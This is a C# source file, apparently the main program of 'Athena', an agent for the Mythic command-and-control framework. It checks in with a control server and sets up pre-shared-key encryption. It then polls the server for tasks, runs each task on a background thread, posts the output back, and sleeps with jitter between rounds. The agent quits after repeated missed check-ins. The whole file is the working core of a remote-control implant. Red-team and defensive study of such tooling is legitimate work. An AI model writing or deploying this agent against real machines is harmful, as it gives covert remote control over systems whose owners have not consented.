using Athena.Commands;
using Athena.Mythic.Model.Checkin;
using Athena.Mythic.Model;
using Athena.Utilities;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System;

namespace Athena
{
    class Program
    {
        static void Main(string[] args)
       {
            int maxMissedCheckins = 5;
            int missedCheckins = 0;
            bool exit = false;

            //MythicClient controls all of the agent communications
            Globals.mc = new MythicClient();
            
            //First Checkin-In attempt
            CheckinResponse res = Globals.mc.CheckIn();
            
            //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
            while((res.status != "success"))
            {
                //Attempt checkin again
                res = Globals.mc.CheckIn();

                //Sleep before attempting checkin again
                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter));
                
                //Increment checkins
                missedCheckins += 1;

                if (missedCheckins == maxMissedCheckins)
                {
                    //bye bye
                    Environment.Exit(0);
                }
            }
            
            //We checked in successfully, reset to 0
            missedCheckins = 0;

            //Update our agent information with the response from the server.
            Globals.mc.MythicConfig.uuid = res.id;
            if (Globals.mc.MythicConfig.currentConfig.encrypted)
            {
                if(Globals.mc.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
                {
                    Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, res.encryption_key);
                }
                else
                {
                    Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, Globals.mc.MythicConfig.currentConfig.psk);
                }
            }

            //Main Loop
            //Need to add the missed checkins check here.
            while (!(missedCheckins == maxMissedCheckins) & !exit)
            {
                List<MythicTask> tasks = Globals.mc.GetTasks();
                if (tasks == null)
                {
                    missedCheckins += 1;
                    if (missedCheckins == maxMissedCheckins)
                    {
                        Environment.Exit(0);
                    }
                }
                else
                {
                    missedCheckins = 0;
                    //Kick off Tasks
                    foreach (var task in tasks)
                    {
                        Globals.jobs.Add(task.id, new MythicJob(task));
                    }

                    //To prevent issues with modifying the array during enumeration
                    Dictionary<string, MythicJob> hasoutput = new Dictionary<string, MythicJob>();
                    //Check jobs to see if they have output
                    foreach (var job in Globals.jobs.Keys)
                    {
                        if (Globals.jobs[job].hasoutput)
                        {
                            hasoutput.Add(job, Globals.jobs[job]);
                            Globals.jobs[job].hasoutput = false;
                        }
                        else if (!Globals.jobs[job].started)
                        {
                            Task.Run(() =>
                            {
                                try
                                {
                                    CommandHandler.StartJob(Globals.jobs[job]);
                                }
                                catch (Exception e)
                                {
                                    Globals.jobs[job].complete = true;
                                    Globals.jobs[job].hasoutput = true;
                                    Globals.jobs[job].taskresult = e.Message;
                                    Globals.jobs[job].errored = true;
                                }
                            });
                        }
                    }
                    //Return output if server is accessible
                    if (hasoutput.Count > 0 || Globals.bagOut.Count > 0)
                    {
                        //Did the POST send properly?
                        //Should I return the object and handle all the parsing shit out here?
                        if (Globals.mc.SendResponse(hasoutput))
                        {
                            //Clear out delegates array
                            //Globals.delegateMessages.Clear();
                            //Remove sent commands from the Global job Dictionary or clear out taskresult of long running tasks
                            foreach (var job in hasoutput.Values)
                            {
                                //Remove job from Global
                                if (job.complete)
                                {
                                    Globals.jobs.Remove(job.task.id);
                                }
                                //Clear out current task buffer for job.
                                else
                                {
                                    string sent = Globals.jobs[job.task.id].taskresult;
                                    if (!String.IsNullOrEmpty(Globals.jobs[job.task.id].taskresult))
                                    {
                                        //Hopefully this fixes the issue with missing text being returned to the server.
                                        Globals.jobs[job.task.id].taskresult = Globals.jobs[job.task.id].taskresult.Replace(sent, "");
                                    }
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine("False");
                        }
                    }
                    //Get sleep and go
                    Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
                }
            }
        }
    }
}
